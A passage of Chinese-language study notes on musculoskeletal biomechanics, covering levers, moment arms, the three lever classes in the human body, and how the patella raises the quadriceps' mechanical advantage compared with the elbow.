\uff1a\u4e00\u79cd\u575a\u786c\u6216\u534a\u575a\u786c\u7684\u7ed3\u6784\uff0c\u5f53\u53d7\u5230\u4e00\u4e2a\u529b\u4f5c\u7528\u5728\u652f\u70b9\u4e4b\u5916\u65f6\uff0c\u4f1a\u5bf9\u963b\u788d\u5b83\u65cb\u8f6c\u7684\u7269\u4f53\u65bd\u52a0\u529b\u3002\u4f8b\u5982\uff0c\u56fe2.1\u4e2d\u5c55\u793a\u4e86\u6760\u6746\u5982\u4f55\u5de5\u4f5c\u3002 \u529b\u81c2 \uff08\u4e5f\u53eb\u6760\u6746\u81c2\u6216\u626d\u529b\u81c2\uff09\uff1a\u662f\u4ece\u529b\u7684\u4f5c\u7528\u7ebf\u5230\u652f\u70b9\u7684\u5782\u76f4\u8ddd\u79bb\u3002\u529b\u7684\u4f5c\u7528\u7ebf\u662f\u4e00\u6761\u901a\u8fc7\u65bd\u529b\u70b9\u5e76\u4e14\u4e0e\u529b\u7684\u65b9\u5411\u4e00\u81f4\u7684\u7ebf\u3002MAF\u548cMRF \u808c\u529b \uff1a\u808c\u8089\u901a\u8fc7\u751f\u5316\u4f5c\u7528\u6216\u975e\u6536\u7f29\u6027\u7ec4\u7ec7\u88ab\u62c9\u957f\u65f6\u4ea7\u751f\u7684\u529b\uff0c\u5c06\u808c\u8089\u7684\u4e24\u7aef\u62c9\u5411\u5f7c\u6b64\u3002FR \u963b\u529b \uff1a\u6765\u81ea\u8eab\u4f53\u5916\u90e8\u7684\u529b\uff08\u4f8b\u5982\u91cd\u529b\u3001\u60ef\u6027\u529b\u548c\u6469\u64e6\u529b\uff09\uff0c\u5176\u4f5c\u7528\u65b9\u5411\u4e0e\u808c\u529b\u76f8\u53cd\u3002FA \u529b\u77e9 \uff08\u4e5f\u53eb\u626d\u77e9\uff09\uff1a\u4e00\u4e2a\u529b\u4f7f\u4e00\u4e2a\u7269\u4f53\u503e\u5411\u4e8e\u56f4\u7ed5\u7279\u5b9a\u652f\u70b9\u65cb\u8f6c\u7684\u7a0b\u5ea6\u3002\u5b83\u7684\u5927\u5c0f\u7b49\u4e8e\u529b\u4e58\u4ee5\u529b\u81c2\u7684\u957f\u5ea6\u3002 \u4ec0\u4e48\u662f\u529b\u77e9\uff1a \u4ec0\u4e48\u662f\u529b\u77e9\uff1f_\u54d4\u54e9\u54d4\u54e9_bilibili \u529b\u77e9\u7684\u65b9\u5411\uff1a \u529b\u77e9\u662f\u77e2\u91cf\u5417\uff1f\u6709\u65b9\u5411\u5417\uff1f_\u54d4\u54e9\u54d4\u54e9_bilibili \u673a\u68b0\u6548\u7387 \uff1a\u662f\u52a8\u529b\u529b\u81c2\u4e0e\u963b\u529b\u529b\u81c2\u7684\u6bd4\u503c\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u60f3\u8c61\u4e00\u4e0b\u7528\u64ac\u68cd\u64ac\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002\u652f\u70b9\u662f\u64ac\u68cd\u7684\u5e95\u90e8\u63a5\u89e6\u5730\u9762\u7684\u5730\u65b9\u3002\u64ac\u68cd\u7684\u4e00\u7aef\u662f\u4f60\u7528\u529b\u7684\u5730\u65b9\uff08\u52a8\u529b\u529b\u81c2\uff09\uff0c\u53e6\u4e00\u7aef\u662f\u64ac\u8d77\u7bb1\u5b50\u7684\u5730\u65b9\uff08\u963b\u529b\u529b\u81c2\uff09\u3002 \u9ad8\u673a\u68b0\u6548\u7387 \uff1a\u5982\u679c\u64ac\u68cd\u7684\u52a8\u529b\u529b\u81c2\u6bd4\u963b\u529b\u529b\u81c2\u957f\u5f88\u591a\uff0c\u4f60\u9700\u8981\u7528\u5f88\u5c0f\u7684\u529b\u5c31\u80fd\u64ac\u8d77\u7bb1\u5b50\u3002 \u4f4e\u673a\u68b0\u6548\u7387 \uff1a\u5982\u679c\u64ac\u68cd\u7684\u52a8\u529b\u529b\u81c2\u6bd4\u963b\u529b\u529b\u81c2\u77ed\u5f88\u591a\uff0c\u4f60\u9700\u8981\u7528\u5f88\u5927\u7684\u529b\u624d\u80fd\u64ac\u8d77\u7bb1\u5b50\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5f53\u673a\u68b0\u6548\u7387\u5927\u4e8e1\u65f6\uff0c\u52a8\u529b\u529b\u81c2\u8f83\u957f\uff0c\u4f60\u7528\u8f83\u5c0f\u7684\u529b\u5c31\u80fd\u5e73\u8861\u8f83\u5927\u7684\u963b\u529b\uff1b\u5f53\u673a\u68b0\u6548\u7387\u5c0f\u4e8e1\u65f6\uff0c\u52a8\u529b\u529b\u81c2\u8f83\u77ed\uff0c\u4f60\u9700\u8981\u7528\u8f83\u5927\u7684\u529b\u624d\u80fd\u5e73\u8861\u963b\u529b\u3002 \u4eba\u4f53\u4e2d\u51e0\u79cd\u6760\u6760 \u7b2c\u4e00\u7c7b\u6760\u6760 \u8fd9\u5f20\u56fe\u7247\u5c55\u793a\u4e86\u8098\u90e8\u4f38\u5c55\u7684\u808c\u8089\u9aa8\u9abc\u6a21\u578b\uff0c\u5e76\u89e3\u91ca\u4e86\u5176\u4e2d\u7684\u529b\u5b66\u539f\u7406\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u6760\u6746\u7c7b\u578b \uff1a \u56fe\u4e2d\u5c55\u793a\u7684\u662f\u4e00\u4e2a \u7b2c\u4e00\u7c7b\u6760\u6746 \u3002\u5728\u7b2c\u4e00\u7c7b\u6760\u6746\u4e2d\uff0c\u652f\u70b9\uff08O\uff09\u4f4d\u4e8e\u808c\u529b\uff08FM\uff09\u548c\u963b\u529b\uff08FR\uff09\u4e4b\u95f4\uff0c\u7c7b\u4f3c\u4e8e\u7fd8\u7fd8\u677f\u7684\u7ed3\u6784\u3002 \u529b\u7684\u4f5c\u7528\u70b9 \uff1a FM\uff08\u808c\u529b\uff09 \uff1a\u7531\u80b1\u4e09\u5934\u808c\u4ea7\u751f\u7684\u529b\uff0c\u4f5c\u7528\u5728\u524d\u81c2\u7684\u8fd1\u7aef\uff08\u9760\u8fd1\u8098\u90e8\uff09\uff0c\u4f7f\u524d\u81c2\u4f38\u5c55\u3002 FR\uff08\u963b\u529b\uff09 \uff1a\u6765\u81ea\u5916\u90e8\u963b\u529b\uff0c\u4f8b\u5982\u624b\u6301\u91cd\u7269\u65f6\u7684\u91cd\u91cf\uff0c\u4f5c\u7528\u5728\u524d\u81c2\u7684\u8fdc\u7aef\uff08\u9760\u8fd1\u624b\u90e8\uff09\uff0c\u4e0eFM\u65b9\u5411\u76f8\u53cd\u3002 \u529b\u81c2 \uff1a MM\uff08\u808c\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FM\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\uff0c\u4e3a5\u5398\u7c73\u3002 MR\uff08\u963b\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FR\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\uff0c\u4e3a40\u5398\u7c73\u3002 \u529b\u5b66\u6548\u7387 \uff1a \u516c\u5f0f\uff1a\u673a\u68b0\u6548\u7387 = MM / MR = 5cm / 40cm = 0.125 \u7531\u4e8eMM\u8fdc\u5c0f\u4e8eMR\uff0c\u6240\u4ee5FM\u5fc5\u987b\u8fdc\u5927\u4e8eFR\u3002\u8fd9\u610f\u5473\u7740\u4e3a\u4e86\u62b5\u6d88\u76f8\u5bf9\u8f83\u5c0f\u7684\u5916\u90e8\u963b\u529b\uff0c\u80b1\u4e09\u5934\u808c\u9700\u8981\u4ea7\u751f\u5f88\u5927\u7684\u529b\u91cf\u3002 \u603b\u7ed3 \uff1a \u8fd9\u79cd\u6760\u6746\u5b89\u6392\u7684\u7279\u70b9\u662f\u9700\u8981\u5f88\u5927\u7684\u808c\u529b\u6765\u62b5\u6d88\u8f83\u5c0f\u7684\u5916\u90e8\u963b\u529b\uff0c\u56e0\u6b64\u79f0\u4e3a\u8d39\u529b\u6760\u6746\u3002\u8fd9\u79cd\u529b\u5b66\u7ed3\u6784\u5728\u4eba\u4f53\u4e2d\u975e\u5e38\u5e38\u89c1\uff0c\u5c24\u5176\u662f\u80a2\u4f53\u7684\u8fd0\u52a8\u4e2d\uff0c\u901a\u8fc7\u8f83\u77ed\u7684\u529b\u81c2\u4ea7\u751f\u8f83\u5927\u7684\u529b\u6765\u8fdb\u884c\u8fd0\u52a8\u3002 \u7b2c\u4e8c\u7c7b\u6760\u6760 \u8fd9\u5f20\u56fe\u7247\u5c55\u793a\u4e86\u8db3\u90e8\u5728\u8e2e\u811a\u52a8\u4f5c\u4e2d\u7684\u808c\u8089\u9aa8\u9abc\u6a21\u578b\uff0c\u5e76\u89e3\u91ca\u4e86\u5176\u4e2d\u7684\u529b\u5b66\u539f\u7406\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u6760\u6746\u7c7b\u578b \uff1a \u56fe\u4e2d\u5c55\u793a\u7684\u662f\u4e00\u4e2a \u7b2c\u4e8c\u7c7b\u6760\u6746 \u3002\u5728\u7b2c\u4e8c\u7c7b\u6760\u6746\u4e2d\uff0c\u652f\u70b9\uff08O\uff09\u4f4d\u4e8e\u808c\u529b\uff08FM\uff09\u548c\u963b\u529b\uff08FR\uff09\u540c\u4e00\u4fa7\uff0c\u7c7b\u4f3c\u4e8e\u624b\u63a8\u8f66\u7684\u7ed3\u6784\u3002 \u529b\u7684\u4f5c\u7528\u70b9 \uff1a FM\uff08\u808c\u529b\uff09 \uff1a\u7531\u8153\u80a0\u808c\uff08\u5c0f\u817f\u540e\u90e8\u7684\u808c\u8089\uff09\u4ea7\u751f\u7684\u529b\uff0c\u4f5c\u7528\u5728\u811a\u8ddf\u4e0a\uff0c\u4f7f\u8eab\u4f53\u62ac\u8d77\u3002 FR\uff08\u963b\u529b\uff09 \uff1a\u6765\u81ea\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u901a\u8fc7\u91cd\u529b\u4f5c\u7528\u5728\u811a\u7684\u524d\u90e8\uff08\u9760\u8fd1\u811a\u8dbe\uff09\uff0c\u4e0eFM\u65b9\u5411\u76f8\u53cd\u3002 \u529b\u81c2 \uff1a MM\uff08\u808c\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FM\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\u3002 MR\uff08\u963b\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FR\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\u3002 \u529b\u5b66\u6548\u7387 \uff1a \u5728\u7b2c\u4e8c\u7c7b\u6760\u6746\u4e2d\uff0c\u808c\u529b\u529b\u81c2\uff08MM\uff09\u957f\u4e8e\u963b\u529b\u529b\u81c2\uff08MR\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5b8c\u6210\u8fd9\u4e00\u52a8\u4f5c\u6240\u9700\u7684\u808c\u529b\u5c0f\u4e8e\u963b\u529b\uff08\u4f53\u91cd\u4ea7\u751f\u7684\u91cd\u529b\uff09\u3002 \u603b\u7ed3 \uff1a \u8fd9\u79cd\u6760\u6746\u5b89\u6392\u7684\u7279\u70b9\u662f\u808c\u529b\u4ea7\u751f\u7684\u4f5c\u7528\u529b\u81c2\u8f83\u957f\uff0c\u56e0\u6b64\u5b8c\u6210\u52a8\u4f5c\u6240\u9700\u7684\u808c\u529b\u76f8\u5bf9\u8f83\u5c0f\u3002\u8e2e\u811a\u52a8\u4f5c\u65f6\uff0c\u8153\u80a0\u808c\u6536\u7f29\uff0c\u901a\u8fc7\u8f83\u957f\u7684\u808c\u529b\u529b\u81c2\u62ac\u9ad8\u8eab\u4f53\u3002\u8fd9\u79cd\u529b\u5b66\u7ed3\u6784\u5728\u4eba\u4f53\u4e2d\u5e38\u89c1\uff0c\u7279\u522b\u662f\u5728\u9700\u8981\u957f\u65f6\u95f4\u627f\u53d7\u91cd\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u7ad9\u7acb\u6216\u884c\u8d70\u3002 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u4eba\u4f53\u80b1\u4e8c\u5934\u808c\u5c48\u8098\u65f6\u7684\u529b\u5b66\u539f\u7406\uff0c\u5c5e\u4e8e\u7b2c\u4e09\u7c7b\u6760\u6746\u3002\u8ba9\u6211\u4eec\u5206\u89e3\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u6587\u5b57\u7684\u5185\u5bb9\uff0c\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u7406\u89e3\u3002 \u7b2c\u4e09\u7c7b\u6760\u6746 \u7b2c\u4e09\u7c7b\u6760\u6746\u7684\u7279\u70b9\u662f\uff1a \u652f\u70b9 (\u8098\u5173\u8282) \uff1a\u4f4d\u4e8e\u6760\u6746\u4e00\u7aef\u3002 \u808c\u529b (FM) \u548c \u963b\u529b (FR) \u5747\u4f5c\u7528\u5728\u652f\u70b9\u7684\u4e00\u4fa7\u3002 \u808c\u529b\u7684\u529b\u81c2 (MM) \u77ed\u4e8e \u963b\u529b\u7684\u529b\u81c2 (MR) \u3002 \u56fe\u793a\u89e3\u6790 \u80b1\u4e8c\u5934\u808c (FM) \uff1a\u56fe\u4e2d\u7684\u7bad\u5934\u6807\u8bc6\u51fa\u80b1\u4e8c\u5934\u808c\u7684\u65b9\u5411\uff0c\u8fd9\u4e2a\u529b\u63a8\u52a8\u524d\u81c2\u4e0a\u5347\u3002 \u963b\u529b (FR) \uff1a\u624b\u4e2d\u63e1\u7740\u7684\u7269\u4f53\u5411\u4e0b\u65bd\u52a0\u7684\u529b\uff0c\u901a\u5e38\u662f\u7531\u4e8e\u91cd\u529b\u4f5c\u7528\u3002 \u529b\u81c2 (MM) \uff1a\u80b1\u4e8c\u5934\u808c\u65bd\u529b\u7684\u529b\u81c2\uff0c\u4ece\u8098\u5173\u8282\u5230\u80b1\u4e8c\u5934\u808c\u9644\u7740\u70b9\u7684\u8ddd\u79bb\u3002 \u963b\u529b\u81c2 (MR) \uff1a\u963b\u529b\u4f5c\u7528\u7684\u529b\u81c2\uff0c\u4ece\u8098\u5173\u8282\u5230\u624b\u4e2d\u7269\u4f53\u7684\u8ddd\u79bb\u3002 \u673a\u68b0\u6548\u7387 \u673a\u68b0\u6548\u7387 \u5c0f\u4e8e 1\uff1a\u56e0\u4e3a\u808c\u529b\u7684\u529b\u81c2\u77ed\u4e8e\u963b\u529b\u7684\u529b\u81c2\uff0c\u6240\u4ee5\u4e3a\u4e86\u5e73\u8861\u963b\u529b\uff0c\u808c\u529b\u5fc5\u987b\u5927\u4e8e\u963b\u529b\u3002 \u5e94\u7528 \uff1a\u5927\u591a\u6570\u4eba\u4f53\u808c\u8089\u5728\u56db\u80a2\u5173\u8282\u5468\u56f4\u5de5\u4f5c\u7684\u673a\u68b0\u6548\u7387\u90fd\u662f\u5c0f\u4e8e 1 \u7684\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5728\u8fd0\u52a8\u65f6\u808c\u8089\u9700\u8981\u4ea7\u751f\u8f83\u5927\u7684\u529b\u6765\u514b\u670d\u8f83\u5c0f\u7684\u963b\u529b\u3002 \u5177\u4f53\u4f8b\u5b50 \u80b1\u4e8c\u5934\u808c\u5f2f\u4e3e \uff1a\u5f53\u4f60\u5f2f\u66f2\u8098\u90e8\uff0c\u63d0\u8d77\u54d1\u94c3\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u65bd\u52a0\u7684\u529b\u5927\u4e8e\u54d1\u94c3\u7684\u91cd\u529b\uff0c\u8fd9\u662f\u56e0\u4e3a\u80b1\u4e8c\u5934\u808c\u7684\u529b\u81c2\u77ed\u4e8e\u54d1\u94c3\u5230\u8098\u5173\u8282\u7684\u8ddd\u79bb\u3002 \u819d\u5173\u8282 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u9acc\u9aa8\u5728\u819d\u5173\u8282\u4f38\u5c55\u4e2d\u7684\u4f5c\u7528\uff0c\u5177\u4f53\u5206\u6790\u4e86\u9acc\u9aa8\u5982\u4f55\u901a\u8fc7\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u819d\u76d6\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u6765\u589e\u52a0\u673a\u68b0\u6548\u7387\u3002\u8ba9\u6211\u4eec\u5206\u89e3\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u6587\u5b57\u7684\u5185\u5bb9\uff0c\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u7406\u89e3\u3002 \u56fe\u793a\u89e3\u6790 \u9acc\u9aa8 (\u819d\u76d6\u9aa8) \uff1a\u4f4d\u4e8e\u819d\u5173\u8282\u524d\u65b9\uff0c\u8d77\u5230\u6760\u6746\u4f5c\u7528\u3002 \u80a1\u9aa8 \uff1a\u5927\u817f\u9aa8\u3002 \u80eb\u9aa8 \uff1a\u5c0f\u817f\u9aa8\u3002 \u80a1\u56db\u5934\u808c\u8171 \uff1a\u8fde\u63a5\u80a1\u56db\u5934\u808c\u548c\u9acc\u9aa8\u3002 \u65cb\u8f6c\u8f74 \uff1a\u819d\u5173\u8282\u7684\u65cb\u8f6c\u4e2d\u5fc3\uff0c\u4f4d\u7f6e\u4f1a\u968f\u7740\u819d\u5173\u8282\u7684\u8fd0\u52a8\u800c\u6539\u53d8\u3002 \u9acc\u97e7\u5e26 \uff1a\u8fde\u63a5\u9acc\u9aa8\u548c\u80eb\u9aa8\u7684\u97e7\u5e26\u3002 \u9acc\u9aa8\u7684\u4f5c\u7528 \u589e\u52a0\u673a\u68b0\u6548\u7387 \uff1a\u9acc\u9aa8\u901a\u8fc7\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u819d\u76d6\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u6765\u589e\u52a0\u673a\u68b0\u6548\u7387\u3002 \u529b\u81c2\u7684\u957f\u5ea6 \uff1a\u9acc\u9aa8\u7684\u4f4d\u7f6e\u4f7f\u5f97\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\u53d8\u957f\uff0c\u8fd9\u6837\u5728\u819d\u5173\u8282\u4f38\u5c55\u65f6\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7528\u529b\u3002 \u673a\u68b0\u6548\u7387\u7684\u53d8\u5316 \u9acc\u9aa8\u5b58\u5728\u65f6 \uff1a\u5982\u56fe(a)\u6240\u793a\uff0c\u9acc\u9aa8\u4f7f\u80a1\u56db\u5934\u808c\u8171\u4e0e\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u589e\u52a0\uff0c\u4ece\u800c\u4fdd\u6301\u8f83\u9ad8\u7684\u673a\u68b0\u6548\u7387\u3002 \u9acc\u9aa8\u7f3a\u5931\u65f6 \uff1a\u5982\u56fe(b)\u6240\u793a\uff0c\u5982\u679c\u6ca1\u6709\u9acc\u9aa8\uff0c\u80a1\u56db\u5934\u808c\u8171\u4f1a\u9760\u8fd1\u819d\u76d6\u7684\u65cb\u8f6c\u8f74\uff0c\u529b\u81c2\u53d8\u77ed\uff0c\u5bfc\u81f4\u673a\u68b0\u6548\u7387\u964d\u4f4e\u3002 \u5177\u4f53\u4f8b\u5b50 \u819d\u5173\u8282\u4f38\u5c55 \uff1a\u5f53\u4f60\u4f38\u5c55\u819d\u5173\u8282\u65f6\uff0c\u9acc\u9aa8\u5e2e\u52a9\u589e\u52a0\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\uff0c\u4f7f\u5f97\u4f60\u80fd\u591f\u66f4\u6709\u6548\u5730\u65bd\u52a0\u529b\u91cf\u3002\u8fd9\u5728\u8dd1\u6b65\u3001\u8df3\u8dc3\u7b49\u9700\u8981\u5f3a\u5927\u819d\u5173\u8282\u4f38\u5c55\u529b\u91cf\u7684\u8fd0\u52a8\u4e2d\u5c24\u4e3a\u91cd\u8981\u3002 \u819d\u5173\u8282\u8fd0\u52a8\u4e2d\u7684\u65cb\u8f6c\u8f74\u53d8\u5316 \u65cb\u8f6c\u8f74\u4f4d\u7f6e\u7684\u53d8\u5316 \uff1a\u7531\u4e8e\u819d\u5173\u8282\u4e0d\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u94f0\u94fe\u5173\u8282\uff0c\u5176\u65cb\u8f6c\u8f74\u7684\u4f4d\u7f6e\u4f1a\u968f\u7740\u8fd0\u52a8\u8303\u56f4\u7684\u6539\u53d8\u800c\u4e0d\u65ad\u53d8\u5316\uff0c\u8fd9\u8fdb\u4e00\u6b65\u5f71\u54cd\u4e86\u80a1\u56db\u5934\u808c\u548c\u8158\u7ef3\u808c\u7684\u529b\u81c2\u957f\u5ea6\u3002 \u8098\u5173\u8282 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u5728\u80b1\u4e8c\u5934\u808c\u53d1\u529b\u4f7f\u8098\u5173\u8282\u5c48\u66f2\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ece\u5173\u8282\u7684\u65cb\u8f6c\u8f74\u5230\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u5728\u6574\u4e2a\u5173\u8282\u6d3b\u52a8\u8303\u56f4\u5185\u7684\u53d8\u5316\u3002\u8ba9\u6211\u4eec\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u76f8\u5173\u5185\u5bb9\u3002 \u56fe\u793a\u89e3\u6790 \u8098\u5173\u8282\u5c48\u66f2\u7684\u4e0d\u540c\u89d2\u5ea6 \uff1a \u56fe\u4e2d\u5c55\u793a\u4e86\u8098\u5173\u8282\u4ece\u4f38\u5c55\u5230\u5c48\u66f2\u7684\u51e0\u4e2a\u4e0d\u540c\u89d2\u5ea6\u3002 \u5728\u6bcf\u4e2a\u89d2\u5ea6\u4e0b\uff0c\u6807\u8bb0\u4e86\u4ece\u8098\u5173\u8282\u7684\u65cb\u8f6c\u8f74\u5230\u80b1\u4e8c\u5934\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\uff08M\uff09\u3002 \u529b\u81c2 (M) \uff1a \u529b\u81c2 (M) \u6307\u7684\u662f\u4ece\u65cb\u8f6c\u8f74\u5230\u808c\u8089\u65bd\u529b\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u3002 \u5728\u56fe\u793a\u7684\u4e0d\u540c\u89d2\u5ea6\u4e0b\uff0c\u529b\u81c2 (M) \u7684\u957f\u5ea6\u53d1\u751f\u53d8\u5316\u3002 \u5173\u952e\u70b9 \u53d8\u5316\u7684\u529b\u81c2 \uff1a \u5728\u8098\u5173\u8282\u4f38\u5c55\u548c\u5c48\u66f2\u7684\u8fc7\u7a0b\u4e2d\uff0c\u529b\u81c2 (M) \u7684\u957f\u5ea6\u5e76\u4e0d\u6052\u5b9a\u3002 \u5f53\u8098\u5173\u8282\u63a5\u8fd1\u5b8c\u5168\u4f38\u5c55\u6216\u5b8c\u5168\u5c48\u66f2\u65f6\uff0c\u529b\u81c2 (M) \u8f83\u77ed\u3002 \u5f53\u8098\u5173\u8282\u5f2f\u66f2\u5230\u4e00\u4e2a\u4e2d\u95f4\u4f4d\u7f6e\u65f6\uff0c\u529b\u81c2 (M) \u8f83\u957f\u3002 \u673a\u68b0\u6548\u7387\u7684\u53d8\u5316 \uff1a \u529b\u81c2 (M) \u8f83\u957f\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u65bd\u529b\u7684\u673a\u68b0\u6548\u7387\u8f83\u9ad8\u3002 \u529b\u81c2 (M) \u8f83\u77ed\u65f6\uff0c\u673a\u68b0\u6548\u7387\u8f83\u4f4e\uff0c\u9700\u8981\u66f4\u591a\u7684\u808c\u8089\u529b\u91cf\u6765\u4ea7\u751f\u540c\u6837\u7684\u529b\u77e9\u3002 \u9acc\u9aa8\u4e0e\u8098\u5173\u8282\u7684\u6bd4\u8f83 \u5728\u819d\u5173\u8282\u4e2d\uff0c\u9acc\u9aa8\u53ef\u4ee5\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u5173\u8282\u65cb\u8f6c\u8f74\u7684\u5782\u76f4\u8ddd\u79bb\u76f8\u5bf9\u6052\u5b9a\uff0c\u4ece\u800c\u63d0\u9ad8\u673a\u68b0\u6548\u7387\u3002 \u5728\u8098\u5173\u8282\u4e2d\uff0c\u6ca1\u6709\u7c7b\u4f3c\u9acc\u9aa8\u7684\u7ed3\u6784\uff0c\u56e0\u6b64\u5728\u8098\u90e8\u8fd0\u52a8\u7684\u8fc7\u7a0b\u4e2d\uff0c\u80b1\u4e8c\u5934\u808c\u8171\u7684\u529b\u81c2\u957f\u5ea6\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u5bfc\u81f4\u673a\u68b0\u6548\u7387\u7684\u53d8\u5316\u3002 \u4e3a\u4ec0\u4e48\u8098\u5173\u8282\u6ca1\u6709\u819d\u76d6\u9aa8\uff1f \u529f\u80fd\u5dee\u5f02 \u819d\u5173\u8282 \uff1a\u4e3b\u8981\u627f\u53d7\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u5e76\u9700\u8981\u5728\u884c\u8d70\u3001\u8dd1\u6b65\u3001\u8df3\u8dc3\u7b49\u6d3b\u52a8\u4e2d\u63d0\u4f9b\u5f3a\u5927\u7684\u652f\u6491\u529b\u548c\u7a33\u5b9a\u6027\u3002\u9acc\u9aa8\u7684\u5b58\u5728\u5e2e\u52a9\u589e\u52a0\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\uff0c\u4ece\u800c\u63d0\u9ad8\u673a\u68b0\u6548\u7387\uff0c\u51cf\u5c11\u808c\u8089\u7684\u75b2\u52b3\u3002 \u8098\u5173\u8282 \uff1a\u4e3b\u8981\u7528\u4e8e\u624b\u81c2\u7684\u7075\u6d3b\u8fd0\u52a8\uff0c\u5982\u6293\u53d6\u3001\u4e3e\u8d77\u7269\u4f53\u7b49\u3002\u8098\u5173\u8282\u4e0d\u9700\u8981\u627f\u53d7\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u66f4\u591a\u7684\u662f\u9700\u8981\u7075\u6d3b\u6027\u548c\u7cbe\u786e\u7684\u63a7\u5236\u3002 \u529b\u5b66\u9700\u6c42 \u819d\u5173\u8282\u7684\u529b\u5b66\u9700\u6c42 \uff1a\u5728\u819d\u5173\u8282\u4e2d\uff0c\u9acc\u9aa8\u901a\u8fc7\u589e\u52a0\u529b\u81c2\u957f\u5ea6\u6765\u63d0\u9ad8\u808c\u8089\u65bd\u529b\u7684\u6548\u7387\uff0c\u8fd9\u662f\u56e0\u4e3a\u819d\u5173\u8282\u9700\u8981\u5728\u627f\u53d7\u8f83\u5927\u8d1f\u8377\u65f6\u63d0\u4f9b\u6709\u6548\u7684\u8fd0\u52a8\u3002 \u8098\u5173\u8282\u7684\u529b\u5b66\u9700\u6c42 \uff1a\u8098\u5173\u8282\u7684\u4e3b\u8981\u529f\u80fd\u662f\u524d\u81c2\u7684\u5c48\u66f2\u548c\u4f38\u5c55\uff0c\u5728\u8fd9\u4e9b\u8fd0\u52a8\u4e2d\u5e76\u4e0d\u9700\u8981\u50cf\u819d\u5173\u8282\u90a3\u6837\u627f\u53d7\u5de8\u5927\u7684\u529b\u91cf\uff0c\u56e0\u6b64\u6ca1\u6709\u9acc\u9aa8\u8fd9\u6837\u7684\u7ed3\u6784\u4e5f\u662f\u5408\u7406\u7684\u3002 \u8fdb\u5316\u548c\u9002\u5e94 \u8fdb\u5316\u8fc7\u7a0b \uff1a\u5728\u8fdb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u4eba\u4f53\u7ed3\u6784\u662f\u6839\u636e\u529f\u80fd\u9700\u6c42\u4f18\u5316\u7684\u3002\u819d\u5173\u8282\u4e3a\u4e86\u9002\u5e94\u76f4\u7acb\u884c\u8d70\u548c\u8dd1\u6b65\u7b49\u6d3b\u52a8\uff0c\u8fdb\u5316\u51fa\u4e86\u9acc\u9aa8\u6765\u63d0\u9ad8\u529b\u5b66\u6548\u7387\u3002 \u8098\u5173\u8282\u7684\u9002\u5e94\u6027 \uff1a\u8098\u5173\u8282\u5219\u66f4\u591a\u662f\u4e3a\u4e86\u9002\u5e94\u7075\u6d3b\u64cd\u4f5c\u3001\u7cbe\u7ec6\u63a7\u5236\u7b49\u529f\u80fd\uff0c\u56e0\u6b64\u5728\u8fdb\u5316\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u53d1\u5c55\u51fa\u7c7b\u4f3c\u9acc\u9aa8\u7684\u7ed3\u6784\u3002 \u7ed3\u6784\u548c\u8fd0\u52a8\u65b9\u5f0f \u819d\u5173\u8282 \uff1a\u4f5c\u4e3a\u4e00\u4e2a\u627f\u91cd\u5173\u8282\uff0c\u5176\u8fd0\u52a8\u65b9\u5f0f\u4e3b\u8981\u662f\u5c48\u66f2\u548c\u4f38\u5c55\uff0c\u540c\u65f6\u9700\u8981\u63d0\u4f9b\u7a33\u5b9a\u6027\uff0c\u56e0\u6b64\u9acc\u9aa8\u7684\u5b58\u5728\u662f\u5408\u7406\u7684\u3002 \u8098\u5173\u8282 